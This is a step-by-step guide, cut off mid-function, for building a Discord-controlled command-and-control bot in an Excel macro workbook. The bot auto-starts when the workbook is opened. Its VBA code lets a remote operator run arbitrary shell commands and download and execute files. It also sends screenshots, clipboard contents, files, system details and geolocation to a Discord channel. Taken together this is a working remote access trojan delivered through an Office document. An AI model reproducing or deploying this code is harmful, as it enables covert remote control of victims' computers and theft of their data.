
# 🚀 The Complete Step-by-Step Guide

## Phase 1: Discord Setup
Before touching Excel, we need to create the bot and get the required IDs.
Check this repo for setup discord bot https://github.com/huzaifa818/Discord-c2 
or go to following steps:
1. **Create the App:** Go to the [Discord Developer Portal](https://discord.com/developers/applications) and click **New Application**. Name it and accept the terms.
2. **Get the Token:** Click **Bot** on the left menu. Click **Reset Token**, copy it, and save it somewhere safe. *(Never share this token!)*
3. **Enable Intents:** Scroll down on the Bot page to **Privileged Gateway Intents**. Turn **ON** the `MESSAGE CONTENT INTENT`. Click **Save Changes**.
4. **Invite the Bot:** Go to **OAuth2 > URL Generator**. Check the `bot` scope. Under Bot Permissions, check `View Channels`, `Send Messages`, `Read Message History`, `Attach Files`, and `Add Reactions`. Copy the Generated URL, paste it into your browser, and invite the bot to your server.
5. **Get IDs:** Open Discord, go to **User Settings > Advanced**, and turn **Developer Mode ON**. 
   * Right-click your server's text channel and click **Copy Channel ID**.
   * Right-click your own profile picture and click **Copy User ID**.

## Phase 2: Excel Preparation
1. Open Microsoft Excel (Desktop version). Create a **Blank Workbook**.
2. **Save as Macro-Enabled:** Go to `File > Save As` and change the file type to **Excel Macro-Enabled Workbook (*.xlsm)**. Name it `DiscordBot.xlsm`.
3. **Open VBA:** Press `Alt + F11` to open the VBA Editor.
4. **Add Reference:** In the VBA Editor, click `Tools > References`. Scroll down, check the box for **Microsoft Scripting Runtime**, and click OK.
5. **Import JSON Library:** Download the `JsonConverter.bas` file from [this GitHub link](https://github.com/VBA-tools/VBA-JSON/blob/master/src/JsonConverter.bas). In the VBA Editor, click `File > Import File` and select the file you just downloaded.

## Phase 3: Adding the Code
You need to create three modules and update the workbook. Right-click in the Project Explorer (left side) and use `Insert > Module` or `Insert > Class Module`.

### 1. ThisWorkbook (Double-click it in the Project Explorer)
Paste this exactly:
```vba
Option Explicit
Public gBot As DiscordBot

Private Sub Workbook_Open()
    Set gBot = New DiscordBot
    gBot.StartListening
End Sub

Private Sub Workbook_BeforeClose(Cancel As Boolean)
    If Not gBot Is Nothing Then
        gBot.StopListening
        Set gBot = Nothing
    End If
End Sub

' Forces the bot to check for messages when you finish typing in Excel
Private Sub Workbook_SheetChange(ByVal Sh As Object, ByVal Target As Range)
    ForceBotPoll
End Sub
Private Sub Workbook_SheetSelectionChange(ByVal Sh As Object, ByVal Target As Range)
    ForceBotPoll
End Sub
Private Sub ForceBotPoll()
    On Error Resume Next
    If Not gBot Is Nothing Then
        If gBot.IsRunning Then gBot.PollForCommands
    End If
End Sub
```

### 2. Class Module: `DiscordBot`
*(Insert > Class Module. Rename it to `DiscordBot` in the Properties window. **CRITICAL:** Change `Instancing` to `2 - PublicNotCreatable` in the Properties window!)*
```vba
Option Explicit
Private mLastMessageId As String
Private mIsRunning As Boolean
Private mScheduledTime As Date

Public Property Get IsRunning() As Boolean
    IsRunning = mIsRunning
End Property

Public Sub StartListening()
    If mIsRunning Then Exit Sub
    Dim initial As Object
    Set initial = DiscordApi.GetMessages(1, "")
    If Not initial Is Nothing Then
        If initial.Count > 0 Then mLastMessageId = CStr(initial(1)("id"))
    End If
    mIsRunning = True
    Debug.Print "Bot listening. Baseline ID: " & mLastMessageId
    ScheduleNextPoll
End Sub

Public Sub StopListening()
    mIsRunning = False
    CancelScheduledPoll
End Sub

Public Sub PollForCommands()
    If Not mIsRunning Then Exit Sub
    On Error GoTo PollErr
    Dim msgs As Object, i As Long, msg As Object
    Set msgs = DiscordApi.GetMessages(10, mLastMessageId)
    If Not msgs Is Nothing Then
        For i = msgs.Count To 1 Step -1
            Set msg = msgs(i)
            mLastMessageId = CStr(msg("id"))
            If Not msg.Exists("author") Then GoTo NextMsg
            If CStr(msg("author")("id")) <> DiscordApi.DISCORD_ALLOWED_USER_ID Then GoTo NextMsg
            If Not msg.Exists("content") Then GoTo NextMsg
            Dim content As String
            content = Trim$(CStr(msg("content")))
            If Left$(content, 1) <> "!" Then GoTo NextMsg
            ExecuteCommand content, CStr(msg("id")), msg
NextMsg:
        Next i
    End If
    ScheduleNextPoll
    Exit Sub
PollErr:
    Debug.Print "Poll error: " & Err.Number & " " & Err.Description
    ScheduleNextPoll
End Sub

Private Sub ExecuteCommand(ByVal content As String, ByVal msgId As String, ByVal msg As Object)
    On Error GoTo CmdErr
    Dim parts() As String
    parts = Split(content, " ", 2)
    Dim cmd As String, arg As String
    cmd = LCase$(parts(0))
    If UBound(parts) >= 1 Then arg = parts(1) Else arg = ""
    
    Select Case cmd
        Case "!help":        BotCommands.Cmd_Help
        Case "!ping":        BotCommands.Cmd_Ping
        Case "!sysinfo":     BotCommands.Cmd_SystemInfo
        Case "!whoami":      BotCommands.Cmd_WhoAmI
        Case "!location":    BotCommands.Cmd_Location
        Case "!ip":          BotCommands.Cmd_IP
        Case "!uptime":      BotCommands.Cmd_Uptime
        Case "!ps":          BotCommands.Cmd_Processes
        Case "!dir", "!ls":  BotCommands.Cmd_Dir arg
        Case "!cat":         BotCommands.Cmd_Cat arg
        Case "!cmd":         BotCommands.Cmd_Shell arg
        Case "!screenshot":  BotCommands.Cmd_Screenshot
        Case "!lock":        BotCommands.Cmd_Lock
        Case "!echo":        BotCommands.Cmd_Echo arg
        Case "!stop":        Me.StopListening: BotCommands.Cmd_Stopped
        Case "!pwd":         BotCommands.Cmd_Pwd
        Case "!cd":          BotCommands.Cmd_Cd arg
        Case "!clip":        BotCommands.Cmd_Clip
        Case "!msgbox":      BotCommands.Cmd_MsgBox arg
        Case "!volume":      BotCommands.Cmd_Volume arg
        Case "!wallpaper":   BotCommands.Cmd_Wallpaper arg
        Case "!download":    BotCommands.Cmd_Download arg
        Case "!run":         BotCommands.Cmd_Run arg
        Case "!upload":      BotCommands.Cmd_Upload msg, arg
        Case Else:           DiscordApi.ReactToMessage msgId, "❓"
    End Select
    Exit Sub
CmdErr:
    DiscordApi.ReactToMessage msgId, "❌"
End Sub

Private Sub ScheduleNextPoll()
    If Not mIsRunning Then Exit Sub
    CancelScheduledPoll
    mScheduledTime = Now + TimeSerial(0, 0, 5)
    Application.OnTime mScheduledTime, "'" & ThisWorkbook.Name & "'!BotPollTick"
End Sub

Private Sub CancelScheduledPoll()
    If mScheduledTime > 0 Then
        On Error Resume Next
        Application.OnTime mScheduledTime, "'" & ThisWorkbook.Name & "'!BotPollTick", , False
        On Error GoTo 0
        mScheduledTime = 0
    End If
End Sub
```

### 3. Standard Module: `DiscordApi`
*(Insert > Module. Rename to `DiscordApi`.)*
```vba
Option Explicit

Public Const DISCORD_API          As String = "https://discord.com/api/v10"
Public Const DISCORD_CHANNEL_ID   As String = "YOUR_CHANNEL_ID_HERE"
Public Const DISCORD_ALLOWED_USER_ID As String = "YOUR_USER_ID_HERE"
Public Const DISCORD_MAX_CONTENT  As Long = 2000
Public Const DISCORD_MAX_FILE_MB  As Long = 8

Public Function DiscordToken() As String
    DiscordToken = "YOUR_BOT_TOKEN_HERE"
End Function

Public Function GetMessages(ByVal limit As Long, ByVal afterId As String) As Object
    Dim endpoint As String
    endpoint = "/channels/" & DISCORD_CHANNEL_ID & "/messages?limit=" & limit
    If Len(afterId) > 0 Then endpoint = endpoint & "&after=" & afterId
    Dim attempts As Long
    For attempts = 1 To 2
        Dim result As Object
        Set result = ApiCall("GET", endpoint, "")
        If Not result Is Nothing Then
            Set GetMessages = result
            Exit Function
        End If
        Sleep 1000
    Next attempts
    Set GetMessages = Nothing
End Function

Public Function ApiCall(ByVal method As String, ByVal endpoint As String, ByVal body As String) As Object
    Dim http As Object, token As String
    token = DiscordToken()
    If Len(token) = 0 Then Set ApiCall = Nothing: Exit Function
    
    On Error GoTo NetErr
    Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
    http.Open method, DISCORD_API & endpoint, False
    http.SetRequestHeader "Authorization", "Bot " & token
    http.SetRequestHeader "User-Agent", "DiscordBot (https://discord.com, 1.0)"
    If Len(body) > 0 Then http.SetRequestHeader "Content-Type", "application/json"
    http.Send body
    
    If http.Status = 429 Then
        Dim retryAfter As Double
        On Error Resume Next
        retryAfter = JsonConverter.ParseJson(http.ResponseText)("retry_after")
        On Error GoTo NetErr
        Sleep retryAfter * 1000 + 250
        http.Send body
    End If
    
    If http.Status >= 200 And http.Status < 300 Then
        If Len(http.ResponseText) = 0 Then
            Set ApiCall = Nothing
        Else
            Set ApiCall = JsonConverter.ParseJson(http.ResponseText)
        End If
    Else
        Set ApiCall = Nothing
    End If
    Set http = Nothing
    Exit Function
NetErr:
    Set ApiCall = Nothing
End Function

Public Function PostTextToDiscord(ByVal text As String) As Boolean
    If Len(DiscordToken()) = 0 Then Exit Function
    If Len(text) > DISCORD_MAX_CONTENT - 100 Then text = Left$(text, DISCORD_MAX_CONTENT - 100) & vbCrLf & "...(truncated)"
    Dim payload As String
    payload = "{""content"":""" & JsonEscape(text) & """}"
    ApiCall "POST", "/channels/" & DISCORD_CHANNEL_ID & "/messages", payload
    PostTextToDiscord = True
End Function

Public Sub ReactToMessage(ByVal messageId As String, ByVal emoji As String)
    Dim enc As String
    If InStr(emoji, "✅") > 0 Or emoji = "Check" Then
        enc = "%E2%9C%85"
    ElseIf InStr(emoji, "❌") > 0 Or emoji = "Cross" Then
        enc = "%E2%9D%8C"
    Else
        enc = "%E2%9D%93"
    End If
    Dim http As Object
    On Error Resume Next
    Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
    http.Open "PUT", DISCORD_API & "/channels/" & DISCORD_CHANNEL_ID & "/messages/" & messageId & "/reactions/" & enc & "/@me", False
    http.SetRequestHeader "Authorization", "Bot " & DiscordToken()
    http.SetRequestHeader "User-Agent", "DiscordBot (https://discord.com, 1.0)"
    http.Send
    Set http = Nothing
End Sub

Public Function UploadFileToDiscord(ByVal filePath As String, ByVal comment As String) As Boolean
    If Len(DiscordToken()) = 0 Then Exit Function
    If Dir$(filePath) = "" Then Exit Function
    If FileLen(filePath) > DISCORD_MAX_FILE_MB * 1024 ^ 2 Then
        PostTextToDiscord "❌ File too large (max " & DISCORD_MAX_FILE_MB & " MB)."
        Exit Function
    End If
    Dim fNum As Integer, fileBytes() As Byte
    fNum = FreeFile
    ReDim fileBytes(FileLen(filePath) - 1)
    Open filePath For Binary Access Read As #fNum
    Get #fNum, , fileBytes
    Close #fNum
    Dim boundary As String
    boundary = "----VBA" & Format$(Now, "yyyymmddhhnnss")
    Dim preamble As String
    preamble = "--" & boundary & vbCrLf & "Content-Disposition: form-data; name=""content""" & vbCrLf & vbCrLf & comment & vbCrLf & "--" & boundary & vbCrLf & "Content-Disposition: form-data; name=""files[0]""; filename=""" & GetFileName(filePath) & """" & vbCrLf & "Content-Type: application/octet-stream" & vbCrLf & vbCrLf
    Dim postamble As String
    postamble = vbCrLf & "--" & boundary & "--" & vbCrLf
    Dim payload() As Byte
    payload = ConcatBytes(StrToBytes(preamble), fileBytes, StrToBytes(postamble))
    On Error GoTo UpErr
    Dim http As Object
    Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
    http.Open "POST", DISCORD_API & "/channels/" & DISCORD_CHANNEL_ID & "/messages", False
    http.SetRequestHeader "Authorization", "Bot " & DiscordToken()
    http.SetRequestHeader "User-Agent", "DiscordBot (https://discord.com, 1.0)"
    http.SetRequestHeader "Content-Type", "multipart/form-data; boundary=" & boundary
    http.Send payload
    Set http = Nothing
    UploadFileToDiscord = True
    Exit Function
UpErr:
    Set http = Nothing
End Function

Public Function DownloadFileFromUrl(ByVal url As String, ByVal savePath As String) As Boolean
    On Error GoTo ErrH
    Dim http As Object, stream As Object
    Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
    http.Open "GET", url, False
    http.SetRequestHeader "User-Agent", "DiscordBot (https://discord.com, 1.0)"
    http.Send
    If http.Status = 200 Then
        Set stream = CreateObject("ADODB.Stream")
        stream.Type = 1
        stream.Open
        stream.Write http.ResponseBody
        stream.SaveToFile savePath, 2
        stream.Close
        DownloadFileFromUrl = True
    Else
        DownloadFileFromUrl = False
    End If
    Exit Function
ErrH:
    DownloadFileFromUrl = False
End Function

Public Function JsonEscape(ByVal s As String) As String
    s = Replace(s, "\", "\\")
    s = Replace(s, """", "\""")
    s = Replace(s, vbCrLf, "\n")
    s = Replace(s, vbLf, "\n")
    s = Replace(s, vbCr, "\n")
    s = Replace(s, vbTab, "\t")
    JsonEscape = s
End Function

Private Function StrToBytes(ByVal s As String) As Byte()
    Dim st As Object
    Set st = CreateObject("ADODB.Stream")
    st.Type = 2: st.Charset = "utf-8": st.Open
    st.WriteText s: st.Position = 0: st.Type = 1
    StrToBytes = st.Read: st.Close
End Function

Private Function ConcatBytes(ParamArray parts() As Variant) As Byte()
    Dim total As Long, i As Long, k As Long, j As Long
    Dim arr() As Byte, result() As Byte
    For i = LBound(parts) To UBound(parts)
        arr = parts(i): total = total + (UBound(arr) - LBound(arr) + 1)
    Next i
    ReDim result(total - 1)
    j = 0
    For i = LBound(parts) To UBound(parts)
        arr = parts(i)
        For k = LBound(arr) To UBound(arr)
            result(j) = arr(k): j = j + 1
        Next k
    Next i
    ConcatBytes = result
End Function

Public Function GetFileName(ByVal p As String) As String
    Dim i As Long: i = InStrRev(p, "\")
    If i > 0 Then GetFileName = Mid$(p, i + 1) Else GetFileName = p
End Function

Public Sub Sleep(ByVal ms As Long)
    Dim t As Single: t = Timer
    Do While (Timer - t) * 1000 < ms
        DoEvents
    Loop
End Sub
```

### 4. Standard Module: `BotCommands`
*(Insert > Module. Rename to `BotCommands`.)*
```vba
Option Explicit

Public Sub BotPollTick()
    If Not ThisWorkbook.gBot Is Nothing Then ThisWorkbook.gBot.PollForCommands
End Sub

Public Sub Cmd_Help()
    Dim h As String
    h = "**🤖 Available Commands**" & vbCrLf & "```" & vbCrLf
    h = h & "!help              - Show this list" & vbCrLf
    h = h & "!ping              - Check bot is alive" & vbCrLf
    h = h & "!sysinfo           - Full VM system information" & vbCrLf
    h = h & "!whoami            - Current user / domain" & vbCrLf
    h = h & "!location          - Public IP geolocation" & vbCrLf
    h = h & "!ip                - Local IP configuration" & vbCrLf
    h = h & "!uptime            - Boot time and uptime" & vbCrLf
    h = h & "!ps                - Running processes" & vbCrLf
    h = h & "!pwd               - Show current directory" & vbCrLf
    h = h & "!cd <path>         - Change directory" & vbCrLf
    h = h & "!ls, !dir <path>   - List directory contents" & vbCrLf
    h = h & "!cat <path>        - Read a text file" & vbCrLf
    h = h & "!cmd <command>     - Run a shell command" & vbCrLf
    h = h & "!run <path>        - Execute a program on the VM" & vbCrLf
    h = h & "!upload [path]     - Upload a file from Discord to VM" & vbCrLf
    h = h & "!download <path>   - Upload file from VM to Discord" & vbCrLf
    h = h & "!screenshot        - Capture screen and upload" & vbCrLf
    h = h & "!clip              - Read VM clipboard" & vbCrLf
    h = h & "!msgbox <text>     - Popup a box on the VM" & vbCrLf
    h = h & "!volume <0-100>    - Adjust volume" & vbCrLf
    h = h & "!wallpaper <url>   - Change desktop background" & vbCrLf
    h = h & "!lock              - Lock the workstation" & vbCrLf
    h = h & "!echo <text>       - Echo text back" & vbCrLf
    h = h & "!stop              - Stop the bot polling loop" & vbCrLf
    h = h & "```"
    DiscordApi.PostTextToDiscord h
End Sub

Public Sub Cmd_Ping()
    DiscordApi.PostTextToDiscord "🏓 Pong! VM is online at " & Format$(Now, "yyyy-mm-dd hh:nn:ss")
End Sub

Public Sub Cmd_WhoAmI()
    Dim info As String
    info = "👤 **Current User**" & vbCrLf & "```" & vbCrLf
    info = info & "Username : " & Environ$("USERNAME") & vbCrLf
    info = info & "Domain   : " & Environ$("USERDOMAIN") & vbCrLf
    info = info & "Computer : " & Environ$("COMPUTERNAME") & vbCrLf
    info = info & "```"
    DiscordApi.PostTextToDiscord info
End Sub

Public Sub Cmd_IP()
    Dim out As String
    out = ShellCapture("ipconfig /all")
    If Len(out) > 1800 Then out = Left$(out, 1800) & "..."
    DiscordApi.PostTextToDiscord "🌐 **Local IP Configuration**" & vbCrLf & "```" & vbCrLf & out & vbCrLf & "```"
End Sub

Public Sub Cmd_Location()
    On Error GoTo ErrH
    Dim http As Object, json As Object
    Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
    http.Open "GET", "https://ipwhois.app/json/", False
    http.SetRequestHeader "User-Agent", "DiscordBot (https://discord.com, 1.0)"
    http.Send
    If http.Status = 200 Then
        Set json = JsonConverter.ParseJson(http.ResponseText)
        If json("success") = True Then
            Dim msg As String
            msg = "📍 **" & json("city") & ", " & json("region") & ", " & json("country") & "**" & vbCrLf
            msg = msg & "🌐 **IP:** `" & json("ip") & "`" & vbCrLf
            msg = msg & "📌 **Coords:** `" & json("latitude") & ", " & json("longitude") & "`" & vbCrLf
            msg = msg & "🏢 **ISP:** `" & json("isp") & "`"
            DiscordApi.PostTextToDiscord msg
        Else
            DiscordApi.PostTextToDiscord "❌ Geolocation failed."
        End If
    Else
        DiscordApi.PostTextToDiscord "❌ HTTP Error: " & http.Status
    End If
    Set http = Nothing
    Exit Sub
ErrH:
    DiscordApi.PostTextToDiscord "❌ Error parsing location data."
    Set http = Nothing
End Sub

Public Sub Cmd_Uptime()
    On Error GoTo ErrH
    Dim wmi As Object, col As Object, it As Object
    Set wmi = GetObject("winmgmts:\\.\root\cimv2")
    Set col = wmi.ExecQuery("SELECT LastBootUpTime FROM Win32_OperatingSystem")
    For Each it In col
        Dim bootTime As Date
        bootTime = WMIDateToDate(it.LastBootUpTime)
        Dim mins As Long: mins = DateDiff("n", bootTime, Now)
        DiscordApi.PostTextToDiscord "⏱️ **Uptime**" & vbCrLf & "```" & vbCrLf & _
            "Last boot : " & Format$(bootTime, "yyyy-mm-dd hh:nn:ss") & vbCrLf & _
            "Uptime    : " & mins \ 1440 & "d " & (mins Mod 1440) \ 60 & "h " & mins Mod 60 & "m" & vbCrLf & "```"
        Exit Sub
    Next it
    Exit Sub
ErrH:
    DiscordApi.PostTextToDiscord "❌ Uptime error: " & Err.Description
End Sub

Public Sub Cmd_Processes()
    Dim out As String
    out = ShellCapture("tasklist /fo table")
    If Len(out) > 1800 Then out = Left$(out, 1800) & "..."
    DiscordApi.PostTextToDiscord "📊 **Processes**" & vbCrLf & "```" & vbCrLf & out & vbCrLf & "```"
End Sub

Public Sub Cmd_SystemInfo()
    Dim info As String
    info = CollectSystemInfo()
    If Len(info) = 0 Then
        DiscordApi.PostTextToDiscord "❌ Could not gather system info."
        Exit Sub
    End If
    DiscordApi.PostTextToDiscord info
End Sub

Public Sub Cmd_Pwd()
    DiscordApi.PostTextToDiscord "📁 Current Directory: `" & CurDir & "`"
End Sub

Public Sub Cmd_Cd(ByVal path As String)
    If Len(Trim$(path)) = 0 Then Exit Sub
    On Error GoTo ErrH
    ChDir path
    DiscordApi.PostTextToDiscord "✅ Changed directory to: `" & CurDir & "`"
    Exit Sub
ErrH:
    DiscordApi.PostTextToDiscord "❌ Directory not found: `" & path & "`"
End Sub

Public Sub Cmd_Dir(ByVal path As String)
    If Len(Trim$(path)) = 0 Then path = CurDir
    On Error GoTo ErrH
    Dim fso As Object, folder As Object, subf As Object, f As Object
    Set fso = CreateObject("Scripting.FileSystemObject")
    Set folder = fso.GetFolder(path)
    Dim info As String
    info = "📁 **" & path & "**" & vbCrLf & "```" & vbCrLf
    For Each subf In folder.SubFolders
        info = info & "[DIR]  " & subf.Name & vbCrLf
        If Len(info) > 1700 Then GoTo Emit
    Next subf
    For Each f In folder.Files
        info = info & "       " & f.Name & "  (" & f.Size & " bytes)" & vbCrLf
        If Len(info) > 1700 Then GoTo Emit
    Next f
Emit:
    info = info & "```"
    DiscordApi.PostTextToDiscord info
    Exit Sub
ErrH:
    DiscordApi.PostTextToDiscord "❌ Dir error: " & Err.Description
End Sub

Public Sub Cmd_Cat(ByVal path As String)
    If Len(Trim$(path)) = 0 Then
        DiscordApi.PostTextToDiscord "❌ Usage: `!cat <path>`"
        Exit Sub
    End If
    If Dir$(path) = "" Then
        DiscordApi.PostTextToDiscord "❌ Not found: `" & path & "`"
        Exit Sub
    End If
    If FileLen(path) > 200000 Then
        DiscordApi.PostTextToDiscord "❌ File too large for inline (`!cat`)."
        Exit Sub
    End If
    Dim content As String
    content = ReadTextFile(path)
    If Len(content) > 1800 Then content = Left$(content, 1800) & vbCrLf & "...(truncated)"
    DiscordApi.PostTextToDiscord "📄 **" & path & "**" & vbCrLf & "```" & vbCrLf & content & vbCrLf & "```"
End Sub

Public Sub Cmd_Shell(ByVal command As String)
    If Len(Trim$(command)) = 0 Then
        DiscordApi.PostTextToDiscord "❌ Usage: `!cmd <command>`"
        Exit Sub
    End If
    Dim out As String
    out = ShellCapture(command)
    If Len(out) = 0 Then out = "(no output)"
    If Len(out) > 1800 Then out = Left$(out, 1800) & "..."
    DiscordApi.PostTextToDiscord "💻 **CMD:** `" & command & "`" & vbCrLf & "```" & vbCrLf & out & vbCrLf & "```"
End Sub

Public Sub Cmd_Run(ByVal path As String)
    If Len(Trim$(path)) = 0 Then
        DiscordApi.PostTextToDiscord "❌ Usage: `!run C:\path\to\program.exe`"
        Exit Sub
    End If
    On Error GoTo ErrH
    Dim wsh As Object
    Set wsh = CreateObject("WScript.Shell")
    wsh.Run Chr(34) & path & Chr(34), 1, False
    DiscordApi.PostTextToDiscord "✅ Executed: `" & path & "`"
    Exit Sub
ErrH:
    DiscordApi.PostTextToDiscord "❌ Failed to execute: " & Err.Description
End Sub

Public Sub Cmd_Upload(ByVal msg As Object, ByVal savePath As String)
    If Not msg.Exists("attachments") Then
        DiscordApi.PostTextToDiscord "❌ You must attach a file with the command."
        Exit Sub
    End If
    Dim atts As Object
    Set atts = msg("attachments")
    If atts.Count = 0 Then
        DiscordApi.PostTextToDiscord "❌ No file attached. Drag and drop a file into Discord!"
        Exit Sub
    End If
    Dim attUrl As String, fileName As String
    attUrl = atts(1)("url")
    fileName = atts(1)("filename")
    If Len(Trim$(savePath)) = 0 Then
        savePath = Environ$("TEMP") & "\" & fileName
    Else
        If Right$(savePath, 1) = "\" Then savePath = savePath & fileName
    End If
    DiscordApi.PostTextToDiscord "⏳ Downloading `" & fileName & "` to VM..."
    If DiscordApi.DownloadFileFromUrl(attUrl, savePath) Then
        DiscordApi.PostTextToDiscord "✅ File saved to: `" & savePath & "`" & vbCrLf & "Type `!run " & savePath & "` to execute it."
    Else
        DiscordApi.PostTextToDiscord "❌ Download failed. Check permissions or file size."
    End If
End Sub

Public Sub Cmd_Download(ByVal path As String)
    If Len(Trim$(path)) = 0 Then
        DiscordApi.PostTextToDiscord "❌ Usage: `!download C:\path\to\file.txt`"
        Exit Sub
    End If
    If Dir$(path) = "" Then
        DiscordApi.PostTextToDiscord "❌ File not found: `" & path & "`"
        Exit Sub
    End If
    DiscordApi.PostTextToDiscord "⏳ Uploading `" & path & "`..."
    DiscordApi.UploadFileToDiscord path, "📁 Downloaded from VM"
End Sub

Public Sub Cmd_Screenshot()
    Dim tempPath As String
    tempPath = Environ$("TEMP") & "\vba_shot_" & Format$(Now, "yyyymmdd_hhnnss") & ".png"
    Dim ps As String
    ps = "Add-Type -AssemblyName System.Windows.Forms; " & _
         "Add-Type -AssemblyName System.Drawing; " & _
         "$b=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds; " & _
         "$bmp=New-Object System.Drawing.Bitmap $b.Width,$b.Height; " & _
         "$g=[System.Drawing.Graphics]::FromImage($bmp); " & _
         "$g.CopyFromScreen($b.Location,[System.Drawing.Point]::Empty,$b.Size); " & _
         "$bmp.Save('" & Replace(tempPath, "\", "\\") & "',[System.Drawing.Imaging.ImageFormat]::Png); " & _
         "$g.Dispose();$bmp.Dispose()"
    Dim out As String
    out = RunPowerShell(ps)
    If Dir$(tempPath) = "" Then
        DiscordApi.PostTextToDiscord "❌ Screenshot failed: " & out
        Exit Sub
    End If
    DiscordApi.UploadFileToDiscord tempPath, "📸 Screenshot at " & Format$(Now, "yyyy-mm-dd hh:nn:ss")
    On Error Resume Next
    Kill tempPath
End Sub

Public Sub Cmd_Clip()
    On Error GoTo ErrH
    Dim html As Object, clipText As String
    Set html = CreateObject("htmlfile")
    clipText = html.parentWindow.clipboardData.getData("Text")
    If Len(Trim$(clipText)) = 0 Then
        DiscordApi.PostTextToDiscord "📋 Clipboard is empty."
    ElseIf Len(clipText) > 1800 Then
        DiscordApi.PostTextToDiscord "📋 Clipboard (Truncated):" & vbCrLf & "```" & Left$(clipText, 1800) & "```"
    Else
        DiscordApi.PostTextToDiscord "📋 Clipboard:" & vbCrLf & "```" & clipText & "```"
    End If
    Exit Sub
ErrH:
    DiscordApi.PostTextToDiscord "❌ Could not read clipboard: " & Err.Description
End Sub

Public Sub Cmd_MsgBox(ByVal text As String)
    If Len(Trim$(text)) = 0 Then Exit Sub
    MsgBox text, vbInformation, "Message from Discord"
    DiscordApi.PostTextToDiscord "✅ Message box closed on VM."
End Sub

Public Sub Cmd_Volume(ByVal level As String)
    If Not IsNumeric(level) Then
        DiscordApi.PostTextToDiscord "❌ Usage: `!volume 50`"
        Exit Sub
    End If
    Dim ps As String
    ps = "(New-Object -ComObject WScript.Shell).SendKeys([char]173); " & _
         "1..50 | ForEach-Object { (New-Object -ComObject WScript.Shell).SendKeys([char]175) }; " & _
         "1.." & CInt(level) & " | ForEach-Object { (New-Object -ComObject WScript.Shell).SendKeys([char]174) }"
    RunPowerShell ps
    DiscordApi.PostTextToDiscord "🔊 Attempted to set volume to " & level & "%"
End Sub

Public Sub Cmd_Wallpaper(ByVal url As String)
    If Len(Trim$(url)) = 0 Then
        DiscordApi.PostTextToDiscord "❌ Usage: `!wallpaper <image_url>`"
        Exit Sub
    End If
    Dim ps As String
    ps = "$img = '" & Environ$("TEMP") & "\wallpaper.jpg'; " & _
         "Invoke-WebRequest -Uri '" & url & "' -OutFile $img; " & _
         "Add-Type -TypeDefinition 'using System.Runtime.InteropServices; public class Wallpaper { [DllImport(\"user32.dll\")] public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni); }'; " & _
         "[Wallpaper]::SystemParametersInfo(20, 0, $img, 3)"
    RunPowerShell ps
    DiscordApi.PostTextToDiscord "🖼️ Wallpaper updated!"
End Sub

Public Sub Cmd_Lock()
    DiscordApi.PostTextToDiscord "🔒 Locking workstation..."
    Shell "rundll32.exe user32.dll,LockWorkStation", vbHide
End Sub

Public Sub Cmd_Echo(ByVal text As String)
    If Len(text) = 0 Then text = "(empty)"
    DiscordApi.PostTextToDiscord "🔊 " & text
End Sub

Public Sub Cmd_Stopped()
    DiscordApi.PostTextToDiscord "🛑 Bot stopped. Reopen the workbook to restart."
End Sub

Private Function CollectSystemInfo() As String
    Dim s As String, wmi As Object, it As Object, col As Object
    On Error GoTo ErrH
    s = "**🖥️ Guest VM System Information**" & vbCrLf
    s = s & "Host: " & Environ$("COMPUTERNAME") & vbCrLf
    s = s & "User: " & Environ$("USERNAME") & vbCrLf
    s = s & "Time: " & Format$(Now, "yyyy-mm-dd hh:nn:ss") & vbCrLf & vbCrLf
    
    Set wmi = GetObject("winmgmts:\\.\root\cimv2")
    Set col = wmi.ExecQuery("SELECT * FROM Win32_OperatingSystem")
    For Each it In col
        s = s & "**OS:** " & it.Caption & " (" & it.OSArchitecture & ")" & vbCrLf
        s = s & "Version: " & it.Version & "  Build: " & it.BuildNumber & vbCrLf
        Exit For
    Next it
    
    Set col = wmi.ExecQuery("SELECT * FROM Win32_Processor")
    For Each it In col
        s = s & "**CPU:** " & Trim$(it.Name) & vbCrLf
        s = s & "Cores: " & it.NumberOfCores & "  Threads: " & it.NumberOfLogicalProcessors & vbCrLf
        Exit For
    Next it
    
    Set col = wmi.ExecQuery("SELECT * FROM Win32_ComputerSystem")
    For Each it In col
        s = s & "**RAM:** " & Format$(it.TotalPhysicalMemory / 1024 ^ 3, "0.00") & " GB" & vbCrLf
        s = s & "Vendor: " & it.Manufacturer & "  Model: " & it.Model & vbCrLf
        Exit For
    Next it
    
    Set col = wmi.ExecQuery("SELECT * FROM Win32_BIOS")
    For Each it In col
        s = s & "**BIOS:** " & it.Manufacturer & "  Serial: " & it.SerialNumber & vbCrLf
        Exit For
    Next it
    
    Set col = wmi.ExecQuery("SELECT * FROM Win32_VideoController")
    For Each it In col
        s = s & "**GPU:** " & it.Name & vbCrLf
        Exit For
    Next it
    
    s = s & vbCrLf & "**Disks:**" & vbCrLf
    Set col = wmi.ExecQuery("SELECT * FROM Win32_LogicalDisk WHERE DriveType=3")
    For Each it In col
        If Not IsNull(it.Size) Then
            s = s & it.DeviceID & "  " & Format$(it.FreeSpace / 1024 ^ 3, "0.00") & " / " & Format$(it.Size / 1024 ^ 3, "0.00") & " GB free" & vbCrLf
        End If
    Next it
    
    s = s & vbCrLf & "**NICs:**" & vbCrLf
    Set col = wmi.ExecQuery("SELECT * FROM Win32_NetworkAdapter WHERE PhysicalAdapter=True")
    For Each it In col
        If Not IsNull(it.MACAddress) Then
            s = s & it.Name & "  MAC=" & it.MACAddress & vbCrLf
        End If
    Next it
    
    CollectSystemInfo = s
    Exit Function
ErrH:
    CollectSystemInfo = "❌ WMI error: " & Err.Description
End Function

Public Function ShellCapture(ByVal command As String) As String
    On Error GoTo ErrH
    Dim wsh As Object, exec As Object, out As String
    Set wsh = CreateObject("WScript.Shell")
    Set exec = wsh.exec("cmd.exe /c " & command)
    Dim t As Single: t = Timer
    Do While exec.Status = 0
        DoEvents
        If Timer - t > 30 Then Exit Do
    Loop
    On Error Resume Next
    out = exec.StdOut.ReadAll
    If Len(exec.StdErr.ReadAll) > 0 Then out = out & vbCrLf & exec.StdErr.ReadAll
    On Error GoTo ErrH
    ShellCapture = out
    Exit Function
ErrH:
    ShellCapture = "(error: " & Err.Description & ")"
End Function

Public Function RunPowerShell(ByVal script As String) As String
    Dim tempPs As String
